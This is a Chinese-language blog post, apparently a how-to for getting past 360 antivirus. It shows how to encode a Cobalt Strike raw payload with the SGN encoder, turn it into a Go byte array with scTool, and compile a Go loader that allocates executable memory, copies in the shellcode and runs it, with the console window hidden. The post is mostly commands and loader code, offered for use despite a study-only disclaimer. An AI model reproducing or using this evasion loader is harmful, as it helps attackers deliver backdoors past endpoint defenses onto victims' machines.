<https://blog.csdn.net/weixin_52091458/article/details/127448228>
声明：以下效果已经失效仅供个人学习测试
^
过360 看大白哥第二个公开课，最近用挺好使的

## **静态混淆**
>SGN：<https://www.freebuf.com/articles/database/244566.html> sgn作者直接在github上发起一项挑战，作者认为认为任何基于规则的静态检测机制都不能检测到用SGN编码的二进制文件，如果有人能编写一个可以检测每个编码输出的 YARA 规则，作者愿意拿出奖金来。

用SGN程序混淆编码原生的cs后门，raw为.bin文件（CS-有效载荷-Payload生成器-raw），文件头默认FC48 83E4，编码后随机。
```
sgn -a 64 -c 1 -o p1.bin -1 payload.bin
生成一次为p1.bin文件
```

## **获取shellcode数组**
scTool工具提取bin文件的shellcode数据 为go字节数组。（PS：CS-有效载荷-Payload生成器-常见语言的shellcode数组）
```
scTool.exe -f p1.bin
```

## **编译成可执行文件**
放入go代码
go编译成新exe
```
go build -ldflags="-H windowsgui" main.go

//-ldflags="-H windowsgui -w -s" 去除运行弹窗
```


```
package main

import (
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)


func main() {
        var (
	    kernel32 = syscall.MustLoadDLL("kernel32.dll")
	    VirtualAlloc = kernel32.MustFindProc("VirtualAlloc")
	    RtlCopyMemory = kernel32.MustFindProc("RtlCopyMemory")
	    shellcode_buf = []byte{
                    shellcodedata//填自己的shellcode
            }
         )
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode_buf)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode_buf[0])), uintptr(len(shellcode_buf)))
	syscall.Syscall(addr, 0, 0, 0, 0)
}

```